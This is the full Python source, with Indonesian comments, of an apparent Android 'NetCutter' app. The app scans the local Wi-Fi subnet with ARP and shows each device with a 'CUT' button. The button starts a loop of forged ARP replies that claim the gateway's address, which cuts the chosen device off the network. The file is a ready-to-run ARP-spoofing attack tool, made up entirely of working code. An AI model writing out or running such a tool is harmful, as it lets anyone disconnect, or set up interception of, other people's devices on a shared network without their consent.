import os
import threading
import time
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from kivy.uix.gridlayout import GridLayout
from kivy.clock import Clock
from scapy.all import ARP, Ether, srp, sendp, conf

# Konfigurasi Interface Android
conf.verb = 0
INTERFACE = "wlan0"

class NetCutterApp(App):
    def build(self):
        self.targets = {} # Menyimpan status spoofing {ip: stop_event}
        
        # UI Utama
        self.layout = BoxLayout(orientation='vertical', padding=10, spacing=10)
        
        self.status_lbl = Label(text="Status: Menunggu...", size_hint_y=None, height=100)
        self.layout.add_widget(self.status_lbl)
        
        self.scan_btn = Button(text="PINDAI JARINGAN", size_hint_y=None, height=120, background_color=(0, 0.7, 1, 1))
        self.scan_btn.bind(on_press=self.start_scan)
        self.layout.add_widget(self.scan_btn)
        
        # List Perangkat
        self.scroll = ScrollView()
        self.device_list = GridLayout(cols=1, spacing=10, size_hint_y=None)
        self.device_list.bind(minimum_height=self.device_list.setter('height'))
        self.scroll.add_widget(self.device_list)
        self.layout.add_widget(self.scroll)
        
        return self.layout

    def get_gateway(self):
        # Default gateway di Android biasanya .1
        return "192.168.1.1" # Anda bisa kembangkan deteksi otomatisnya nanti

    def start_scan(self, instance):
        self.status_lbl.text = "Memindai... (Pastikan Izin Root Aktif)"
        threading.Thread(target=self.run_scan, daemon=True).start()

    def run_scan(self):
        try:
            gw = self.get_gateway()
            ip_range = ".".join(gw.split('.')[:-1]) + ".0/24"
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_range), timeout=2, iface=INTERFACE, verbose=False)
            
            Clock.schedule_once(lambda dt: self.device_list.clear_widgets())
            for _, rcv in ans:
                Clock.schedule_once(lambda dt, ip=rcv.psrc, mac=rcv.hwsrc: self.add_device(ip, mac))
            
            Clock.schedule_once(lambda dt: setattr(self.status_lbl, 'text', f"Ditemukan {len(ans)} Perangkat"))
        except Exception as e:
            Clock.schedule_once(lambda dt: setattr(self.status_lbl, 'text', f"Error: {str(e)}"))

    def add_device(self, ip, mac):
        row = BoxLayout(orientation='horizontal', size_hint_y=None, height=150, padding=5)
        row.add_widget(Label(text=f"IP: {ip}\nMAC: {mac}", halign='left'))
        
        btn = Button(text="CUT", size_hint_x=0.3)
        btn.bind(on_press=lambda x: self.toggle_cut(ip, mac, btn))
        row.add_widget(btn)
        self.device_list.add_widget(row)

    def toggle_cut(self, ip, mac, btn):
        if ip in self.targets:
            self.targets[ip].set()
            del self.targets[ip]
            btn.text = "CUT"
            btn.background_color = (1, 1, 1, 1)
        else:
            stop_event = threading.Event()
            self.targets[ip] = stop_event
            threading.Thread(target=self.arp_spoof, args=(ip, mac, stop_event), daemon=True).start()
            btn.text = "STOP"
            btn.background_color = (1, 0, 0, 1)

    def arp_spoof(self, target_ip, target_mac, stop_event):
        gw_ip = self.get_gateway()
        # Paket palsu: Mengatakan kepada target bahwa kita adalah Gateway
        pkt = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gw_ip)
        while not stop_event.is_set():
            sendp(pkt, iface=INTERFACE, verbose=False)
            time.sleep(2)

if __name__ == '__main__':
    NetCutterApp().run()
